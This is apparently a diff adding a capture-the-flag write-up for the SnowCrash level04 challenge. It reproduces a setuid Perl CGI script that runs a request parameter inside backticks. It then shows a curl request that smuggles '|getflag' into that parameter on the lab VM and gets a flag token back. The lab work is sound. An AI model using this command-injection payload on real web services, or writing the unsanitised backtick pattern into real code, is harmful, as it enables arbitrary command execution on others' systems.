@@ -1,0 +1,30 @@
+# As always, i check the files in the home
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+level04@SnowCrash:~$ file level04.pl
+level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
+# I noticed that the owner of the file is flag04, and the script is a
+	setuid, setgid perl script
+=======================================================================
+# Cool (no), a perl script ! Let's cat it
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+=======================================================================
+# First i tried to exploit it this way like a SQL injection
+perl level04.pl x=' | getflag'
+Nope there is no token here for you sorry. Try again :)
+=======================================================================
+# Well maybe the setuid, setgid is effective when requesting from
+	a client
+➜  Snowcrash git:(master) ✗ curl 192.168.56.101:4747/\?x\=\|getflag
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
